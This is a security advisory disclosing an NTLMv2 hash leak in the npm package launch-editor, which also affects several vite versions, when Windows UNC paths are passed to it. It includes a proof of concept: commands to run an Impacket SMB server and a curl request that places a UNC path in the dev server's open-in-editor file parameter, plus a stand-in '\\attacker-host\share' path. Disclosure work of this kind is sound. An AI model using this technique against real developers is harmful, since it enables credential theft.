# [M] launch-editor: NTLMv2 hash disclosure via UNC path handling on Windows

## Summary
Severity: Medium
Advisory: GHSA-v6wh-96g9-6wx3
CVE: CVE-2026-53632
CWE: CWE-522, CWE-73
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-06-15
Source: https://github.com/advisories/GHSA-v6wh-96g9-6wx3
Type: github-advisory

## Affected
- npm: `launch-editor` — affected >=0 <2.14.1
- npm: `vite` — affected >=8.0.0 <8.0.16
- npm: `vite` — affected >=7.0.0 <7.3.5
- npm: `vite` — affected >=0 <6.4.3
- npm: `vite-plus` — affected >=0 <0.1.24

## Details
### Summary
The `launch-editor` NPM package accesses arbitrary paths including Windows UNC paths. When a UNC path is opened, Windows automatically attempts NTLM authentication to the remote host, causing the user’s NTLMv2 password hash to be leaked to an attacker-controlled SMB server. This can result in credential compromise through offline hash cracking.

### Impact

If the following conditions are met, an attacker can get the NTLMv2 password hash on the computer that is using the `launch-editor`:

- using Windows
- NTLM is not disabled ([it is recommended to disable](https://techcommunity.microsoft.com/blog/windows-itpro-blog/advancing-windows-security-disabling-ntlm-by-default/4489526), while it's still enabled by default)
- the user accesses the attackers website that sends request to a middleware using `launch-editor`
- the server that has the middleware using `launch-editor` is running
- the attacker knows the URL for that server and the middleware

This would be a problem if the user password is too simple that it can be identified through offline hash cracking, potentially leading to further compromise of developer accounts or internal systems.

### Details
`launch-editor` accepts file paths without validating or restricting Windows UNC paths such as:

```
\\attacker-host\share
```

On Windows systems, accessing a UNC path triggers an automatic NTLM authentication attempt to the remote SMB server. No user interaction or warning is required for this authentication attempt to occur.

If an attacker controls the SMB server referenced by the UNC path the victim’s NTLMv2 hash is transmitted to the attacker. The attacker can then capture the hash and perform offline password cracking. Successful cracking reveals the victim’s cleartext password.

The attacker could target a developer that uses a development server using `launch-editor` to develop code locally, send them a link and grab their NTLMv2 hash.

### PoC
From the attacker side, we will setup an SMB server. I personally used [Impacket's smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py), but you could use something like [Responder](https://github.com/lgandx/Responder) for this as well. For keeping it simple, we will use `smbserver.py` here.

First, let's create a directory to serve as an SMB share.
```
mkdir /tmp/data
echo "Hello world" > /tmp/data/test.txt
```

Then, start the SMB server.
```
$ sudo smbserver.py -smb2support -debug share /tmp/data
```

Now, run any project that uses the launch-editor package. I have setup a simple "Hello world" project that uses Vite to do this. Then run the project locally (`vite`).

Now last, we will open a browser window and navigate to the URL used by the launch-editor package to trigger the NTLM authentication. Or we can use `curl` to achieve the same.

```
curl 'http://localhost:5173/__open-in-editor?file=%5c%5c127.0.0.1%5cshare%5ctest.txt'
```

Note the IP address in the HTTP request, and make sure it connects to the IP address of the SMB server. Now we can look at the logs of `smbserver.py` and see the NTLMv2 hash coming in.

<img width="1916" height="277" alt="2026-01-30_10-58" src="https://github.com/user-attachments/assets/2f606e8f-c9bb-41dc-b507-ea6606b53368" />

## References
- https://github.com/vitejs/launch-editor/security/advisories/GHSA-v6wh-96g9-6wx3
- https://github.com/vitejs/launch-editor
